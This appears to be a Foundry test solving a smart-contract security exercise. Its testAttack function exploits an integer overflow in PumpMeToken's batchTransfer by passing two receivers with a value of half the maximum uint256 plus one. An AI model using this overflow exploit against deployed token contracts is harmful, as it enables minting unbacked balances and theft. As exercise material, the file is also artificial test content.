// SPDX-License-Identifier: MIT
pragma abicoder v2;
pragma solidity ^0.7.0;

import {Test, console} from "forge-std/Test.sol";
import {PumpMeToken} from "../../src/ao-4/PumpMeToken.sol";
import {IERC20} from "../../src/ao-3/AIvestToken.sol";

contract PumpMeTokenTest is Test {

    address deployer = makeAddr("deployer");
    address attacker = makeAddr("you");
    address oneReceiver = makeAddr("oneReceiver");
    address[] receivers;

    uint256 constant MAX_UINT = type(uint256).max;

    PumpMeToken pump;
    uint256 constant INIT_SUPPLY = 1000000;

    function setUp() public {
        vm.startPrank(deployer);
        pump = new PumpMeToken(INIT_SUPPLY);
        vm.stopPrank();
    }

    function testAttack() public {
        assertEq(pump.balanceOf(deployer), 1000000);

        vm.startPrank(attacker);
        receivers.push(attacker);
        receivers.push(oneReceiver);
        uint256 value = MAX_UINT / 2 + 1;
        pump.batchTransfer(receivers, value);
        vm.stopPrank();
    }
}